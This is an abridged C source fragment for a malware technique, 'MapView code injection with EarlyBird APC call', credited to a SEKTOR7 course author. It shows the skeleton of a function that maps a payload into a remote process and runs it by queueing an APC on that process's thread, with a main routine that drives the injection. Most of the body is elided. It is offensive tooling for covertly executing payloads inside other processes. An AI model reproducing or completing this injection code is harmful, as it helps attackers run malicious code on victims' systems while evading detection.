/*
 ...
 MapView code injection with EarlyBird APC call
 
 author of base code: reenz0h (twitter: @SEKTOR7net)
...
int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len, STARTUPINFO si, PROCESS_INFORMATION pi) {
	...
	// Execute the section view with APC
	QueueUserAPC((PAPCFUNC)pRemoteView, pi.hThread, NULL);
...
int main(void) {
	...
	if (pid) {
		...
		if (hProc != NULL) {
			...
			InjectVIEW(hProc, payload, payload_len, si, pi);
			CloseHandle(hProc);
		}
	}
